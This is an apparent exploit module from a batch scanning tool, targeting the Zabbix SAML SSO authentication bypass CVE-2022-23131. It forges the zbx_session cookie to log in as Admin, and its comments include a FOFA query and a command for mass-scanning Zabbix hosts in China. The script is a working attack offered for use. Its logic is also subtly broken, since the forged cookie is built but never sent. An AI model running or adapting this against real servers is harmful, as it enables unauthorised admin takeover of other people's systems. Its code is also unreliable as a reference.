# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-09-11 23:13

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
import urllib.parse
import re
import base64
import json

# fofa: app="ZABBIX-监控系统" && country="CN"
# python3 batch.py -m exploit.scripts.Zabbix.CVE-2022-23131 -cs -fs "app=\"ZABBIX-监控系统\" && body=\"SAML\""


class Script(BaseScript):
    name = 'zabbix'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.BYPASSPERMISSION
        # 编号
        self.bug_number = 'CVE-2022-23131'
        # 来源
        self.bug_refer = 'https://www.freebuf.com/vuls/323321.html'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/index_sso.php']
        # 相关信息
        self.info = '''在启用 SAML SSO 身份验证（非默认）的情况下，未经身份验证的攻击者可以通过修改Cookie数据，绕过身份认证获得对 Zabbix 前端的管理员访问权限 about version 4.0.36,5.4.0,5.4.8,6.0.0alpha1'''
        # verify cookie
        self.verify_set_cookie = ''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'https://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                    await asyncio.sleep(2)
                    if response is not None and 'zbx_session=' in response.headers.get('Set-Cookie', ''):
                        self.verify_set_cookie = response.headers.get('Set-Cookie')
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                re_content = re.search(r'zbx_session=(.*?);', self.verify_set_cookie)
                if re_content:  # 这个是为了如果通过直接exec的话，没有匹配这里就会直接报错，所以这里加了判断，提高点健全性
                    receive_data = base64.b64decode(urllib.parse.unquote(re_content.group(1)))
                    receive_data = json.loads(receive_data)
                    receive_data["saml_data"] = {"username_attribute": "Admin"}
                    headers.update({'Cookie': 'zbx_session={}'.format(base64.b64encode(json.dumps(receive_data).encode()))})
                    async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False, allow_redirects=False) as response:
                        await asyncio.sleep(2)
                        if response is not None and response.status == 302 and response.headers.get('location', '') \
                                and 'https://accounts.google.com/o/saml2/idp?idpid=' in response.headers.get('location') \
                                and 'index_sso.php' in response.headers.get('location'):
                            gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                            return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass